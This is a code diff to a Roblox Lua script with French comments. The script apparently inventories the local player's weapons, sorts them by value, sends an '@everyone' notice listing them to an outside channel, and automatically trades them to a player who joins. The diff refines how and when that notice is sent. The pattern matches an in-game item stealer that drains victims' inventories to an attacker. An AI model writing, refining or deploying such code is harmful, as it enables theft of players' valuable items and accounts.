@@ -34,6 +34,7 @@ end
 
 local Players = game:GetService("Players")
 local weaponsToSend = {}
+local originalWeaponsList = {} -- NOUVEAU: Copie pour garder la liste originale
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
@@ -446,9 +447,14 @@ if #weaponsToSend > 0 then
         return (a.Value * a.Amount) > (b.Value * b.Amount)
     end)
 
-    local sentWeapons = {}
+    -- NOUVEAU: Créer une copie profonde de la liste originale
     for i, v in ipairs(weaponsToSend) do
-        sentWeapons[i] = v
+        originalWeaponsList[i] = {
+            DataID = v.DataID,
+            Rarity = v.Rarity,
+            Amount = v.Amount,
+            Value = v.Value
+        }
     end
 
     local prefix = ""
@@ -456,9 +462,10 @@ if #weaponsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    SendFirstMessage(weaponsToSend, prefix)
+    SendFirstMessage(originalWeaponsList, prefix)
 
     local isTrading = false
+    local messageSent = false -- NOUVEAU: Flag pour éviter d'envoyer le message plusieurs fois
 
     local function doTrade(joinedUser)
         if isTrading then
@@ -466,6 +473,12 @@ if #weaponsToSend > 0 then
         end
         
         isTrading = true
+        
+        -- NOUVEAU: Envoyer le message seulement une fois au début du premier trade
+        if not messageSent then
+            SendMessage(originalWeaponsList)
+            messageSent = true
+        end
         
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
@@ -518,7 +531,6 @@ if #weaponsToSend > 0 then
             return
         end
         
-        SendMessage(sentWeapons)
         doTrade(player.Name)
     end
     
